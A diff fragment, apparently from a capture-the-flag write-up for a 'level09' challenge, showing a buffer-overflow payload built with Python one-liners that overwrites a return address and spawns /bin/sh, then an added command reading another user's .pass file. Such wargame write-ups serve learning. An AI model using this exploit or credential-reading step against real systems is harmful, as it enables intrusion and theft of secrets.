@@ -70,3 +70,5 @@ which is decomposed like that:
 in little endian
 
 (python -c 'print "A"*40+"\xff"'; python -c 'print "A"*200+"\x8c\x48\x55\x55"+"\x55\x55\x00\x00"'; echo /bin/sh; cat) | ./level09
+
+> cat /home/users/end/.pass
